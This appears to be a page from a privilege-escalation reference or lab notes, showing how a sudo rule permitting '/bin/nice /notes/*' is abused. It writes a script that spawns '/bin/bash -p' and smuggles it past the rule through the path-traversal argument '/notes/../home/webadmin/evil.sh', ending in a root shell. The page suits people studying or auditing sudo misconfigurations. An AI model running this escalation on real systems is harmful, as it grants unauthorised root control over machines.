---
layout: default
title: Nice
parent: Sudo
nav_order: 11
---

# Nice

---

## Sudo -l

```bash
webadmin@serv:/home/florianges$ sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*

```

We can run _/bin/nice_ with sudo privileges against anything after _/notes/_.

If we place a script to execute a _/bin/bash_ shell in our _/home/webadmin_ directory we should get a shell with root privileges.

```bash
webadmin@serv:~$ vi evil.sh

# write a simple /bin/bash script
#!/bin/bash

/bin/bash -p

# Make the script executable
chmod +x evil.sh

# Execute and get elevated privileges
webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/evil.sh
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root)


```
